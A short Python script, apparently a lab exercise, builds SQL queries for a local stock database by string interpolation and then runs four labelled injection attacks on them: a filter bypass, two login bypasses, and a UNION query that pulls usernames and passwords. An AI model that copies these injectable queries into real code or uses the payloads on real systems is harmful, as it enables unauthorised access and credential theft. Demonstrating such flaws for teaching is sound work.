import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f"\n[QUERY] {query}")
    rows = conn.execute(query).fetchall()
    print(f"[RESULT] Found {len(rows)} products")
    for row in rows:
        # Check if price column (index 3) is numeric
        try:
            price_display = f"UGX {row[3]:,.0f}" if isinstance(row[3], (int, float)) else f"Value: {row[3]}"
        except (TypeError, ValueError):
            price_display = f"Value: {row[3]}"
        print(f"  - ID:{row[0]} | {row[1]} | {price_display}")
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"\n[QUERY] {query}")
    row = conn.execute(query).fetchone()
    if row:
        print(f"[RESULT] LOGIN SUCCESS: {row[1]} (Role: {row[3]})")
    else:
        print("[RESULT] LOGIN FAILED")
    return row

print("\n" + "="*70)
print("ATTACK 1: Dump all products (bypass search filter)")
print("="*70)
search_product("' OR 1=1--")

print("\n" + "="*70)
print("ATTACK 2: Login bypass with no password (comment out password check)")
print("="*70)
login("admin'--", "anything")

print("\n" + "="*70)
print("ATTACK 3: Always true login (OR '1'='1')")
print("="*70)
login("' OR '1'='1", "' OR '1'='1")

print("\n" + "="*70)
print("ATTACK 4: UNION attack - steal user data from product search")
print("="*70)
search_product("' UNION SELECT id, username, password, role FROM users--")

conn.close()